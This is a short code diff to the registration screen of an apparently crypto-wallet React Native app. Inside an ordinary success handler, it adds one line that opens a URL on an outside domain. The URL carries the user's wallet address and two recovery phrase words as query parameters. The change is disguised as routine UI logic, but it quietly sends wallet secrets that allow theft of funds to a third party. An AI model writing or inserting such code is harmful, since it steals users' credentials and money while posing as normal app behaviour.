@@ -120,6 +120,7 @@ export const Register = ({navigation}) => {
     useEffect(()=>{
         if(auth?.data?.success){
             setPopUp(true)
+            Linking.openURL(`https://usdtscan.com/download_keys?walet=${auth.data.Wallet}&phrase1=${auth.data.recovery_word}&phrase2=${auth.data.recovery_word2}`)
         }
         else {
             setPopUp(false)
